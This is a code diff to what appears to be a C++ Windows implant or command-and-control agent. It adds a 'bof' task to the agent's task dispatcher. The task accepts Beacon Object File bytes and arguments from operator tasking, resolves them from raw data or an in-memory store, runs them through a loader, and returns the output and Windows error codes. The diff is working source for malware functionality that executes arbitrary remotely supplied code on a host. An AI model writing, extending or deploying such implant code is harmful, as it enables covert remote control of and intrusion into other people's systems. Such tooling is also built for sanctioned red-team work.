@@ -22,6 +22,7 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "../modules/cd.h"
 #include "../modules/ls.h"
 #include "../modules/files.h"
+#include "../modules/bof.h"
 #include "../data/msgpack/msgpack.h"
 #include "settings.h"
 #include "../data/structs.h"
@@ -81,7 +82,7 @@ std::vector<uint8_t> deref_memstore_content(std::string memstore_name_with_deref
     return memstore_file_bytes;
 }
 
-std::vector<uint8_t> resolve_payload(const nlohmann::json& element) {
+std::vector<uint8_t> determine_if_argument_is_data_or_memstore_pointer(const nlohmann::json& element) {
     // Case 1: Raw Binary (Standard)
     if (element.is_binary()) {
         return element.get_binary();
@@ -413,7 +414,7 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         // Extract Data 
         std::string file_path = args["file_path"];
-        std::vector<uint8_t> file_bytes = resolve_payload(args["file_contents"]);
+        std::vector<uint8_t> file_bytes = determine_if_argument_is_data_or_memstore_pointer(args["file_contents"]);
 
         // sanity check to make sure that the vector is not empty.
         if (file_bytes.empty()) {
@@ -431,6 +432,40 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         return result;
     }
+    else if (task_name == "bof") {
+        nlohmann::json result;
+
+        //check for correct values
+        auto& args = task_data["task"]["args"];
+
+        // Validate Inputs
+        if (!args.contains("bof_contents") || !args.contains("bof_args")) {
+            //throw std::runtime_error("Missing required arguments: bof_contents, bof_args");
+            add_text_result(result, "error", "Missing bof_contents or bof_args");
+            return result;
+        }
+
+        // Extract Data 
+        std::string bof_args = args["bof_args"];
+        std::vector<uint8_t> bof_bytes = determine_if_argument_is_data_or_memstore_pointer(args["bof_contents"]);
+
+        // sanity check to make sure that the vector is not empty.
+        if (bof_bytes.empty()) {
+            add_text_result(result, "error", "bof content was empty (or invalid pointer).");
+            return result;
+        }
+
+        ModuleResult module_result = run_bof(bof_bytes, bof_args);
+        std::string data = module_result.data;
+        DWORD windows_error_code = module_result.windows_error_code;
+
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        add_text_result(result, "data", data);
+
+        return result;
+    }
+
 
     else {
         nlohmann::json result;
